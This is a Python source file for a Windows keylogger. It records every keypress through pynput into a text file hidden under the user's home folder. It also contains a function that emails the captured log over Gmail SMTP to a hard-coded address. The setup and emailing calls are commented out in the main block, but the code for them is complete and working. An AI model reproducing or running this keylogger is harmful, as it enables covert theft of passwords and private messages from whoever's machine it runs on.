import pathlib, smtplib
from pathlib import Path
import os, subprocess
from pynput import keyboard
from email.mime.text import MIMEText







def check_for_keylogger(User_Path):
    Folder_List = []
    for folder in User_Path.iterdir():
        Folder_List.append(folder)
    print(Folder_List)
    try:
        if "keylogger" not in Folder_List:
            os.mkdir(f"{User_Path}\\keylogger")
            subprocess.run(f"echo start > {User_Path}\\keylogger\\keylogger.txt", shell=True)
            subprocess.run(f"attrib +H {User_Path}\\keylogger\\keylogger.txt",check=True, shell=True)
        else:
            pass
    except:
        print("file is already created")

def send_data(path_to_keylogger):
    smtp_server_gmail = "smtp.gmail.com" #This is the default server for gmail
    sender_email = "emollman27@gmail.com"
    receiver_email = "emollman27@gmail.com"
    with open(path_to_keylogger, "r") as file:
        file_data = []
        file_data.append(file.readlines())

    SUBJECT = 'Keylogger'
    msg = (f"Hi, Elliot, here is the data for today: {file_data}")


    msg = MIMEText(msg)
    msg['Subject'] = SUBJECT
    msg['To'] = receiver_email
    msg['From'] = sender_email


    port = 587
    password = "Password goes here" #This password can be created on your google account. It is called an app password.

    server = smtplib.SMTP(smtp_server_gmail, port)

    status_code, response = server.ehlo()
    print(f"pinging server: {status_code} {response}")

    status_code, response = server.starttls()
    print(f"starting TLS connection: {status_code} {response}")

    server.login(sender_email, password)

    server.sendmail(sender_email, receiver_email, msg.as_string())

def KeyPressed(key):
    with open(path_to_keylogger, 'a') as log:
        try:
            char = key.char
            log.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    drive_letter = pathlib.Path.home().drive
    Drive_Path = Path(f"{drive_letter}\\")
    User_Path = Path(os.path.expanduser('~'))
    path_to_keylogger = (f"{User_Path}\\keylogger\\keylogger.txt")

#    check_for_keylogger(User_Path)
#    send_data(path_to_keylogger)
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    print("starting keylogger")
    input()
